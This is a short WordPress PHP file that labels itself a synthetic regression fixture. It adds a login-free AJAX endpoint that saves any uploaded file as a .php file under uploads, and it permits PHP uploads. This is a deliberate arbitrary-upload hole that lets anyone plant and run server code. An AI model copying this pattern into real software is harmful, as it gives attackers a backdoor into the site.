<?php
/* Synthetic regression fixture. This is not third-party plugin source. */

add_action('wp_ajax_nopriv_receive_package', 'receive_package');
add_filter('upload_mimes', 'allow_package_mimes');

function receive_package() {
    $upload = wp_handle_upload($_FILES['package'], ['test_form' => false]);
    $destination = WP_CONTENT_DIR . '/uploads/staged-package.php';
    file_put_contents($destination, file_get_contents($upload['file']));
}

function allow_package_mimes($mimes) {
    $mimes['php'] = 'application/x-httpd-php';
    return $mimes;
}
